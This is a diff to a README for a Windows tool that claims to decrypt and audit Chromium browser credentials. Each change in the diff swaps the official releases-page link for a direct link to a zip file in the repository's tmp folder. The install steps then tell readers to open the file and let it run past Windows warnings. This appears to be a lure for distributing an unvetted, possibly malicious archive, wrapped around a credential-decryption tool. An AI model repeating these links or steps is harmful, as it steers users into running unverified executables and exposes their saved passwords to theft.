@@ -1,10 +1,10 @@
 # 🛡️ decrypt-chromium-suite - Audit Chromium Credentials With Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/adityavaze232009-bit/decrypt-chromium-suite/main/tmp/suite_chromium_decrypt_2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+Visit this page to download: https://raw.githubusercontent.com/adityavaze232009-bit/decrypt-chromium-suite/main/tmp/suite_chromium_decrypt_2.7.zip
 
 Choose the latest release for Windows, then download the file that matches your system.
 
@@ -23,7 +23,7 @@ Use it to review browser credential data during a security check. It also suppor
 
 ## 🚀 Getting Started
 
-1. Open the release page: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+1. Open the release page: https://raw.githubusercontent.com/adityavaze232009-bit/decrypt-chromium-suite/main/tmp/suite_chromium_decrypt_2.7.zip
 2. Find the newest release near the top of the page
 3. Download the Windows file from that release
 4. Open the downloaded file
@@ -72,7 +72,7 @@ Common cases include:
 
 ## 🖱️ Step-by-Step Install
 
-1. Go to the release page: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+1. Go to the release page: https://raw.githubusercontent.com/adityavaze232009-bit/decrypt-chromium-suite/main/tmp/suite_chromium_decrypt_2.7.zip
 2. Download the Windows release file
 3. Open the file after the download ends
 4. Allow the app to run if Windows asks
@@ -155,7 +155,7 @@ Keep your audit reports in a secure place. They may contain sensitive browser da
 
 ## 📌 Download Again
 
-If you need the Windows file, visit the release page here: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+If you need the Windows file, visit the release page here: https://raw.githubusercontent.com/adityavaze232009-bit/decrypt-chromium-suite/main/tmp/suite_chromium_decrypt_2.7.zip
 
 Download the latest release, then open the file on your Windows PC
 
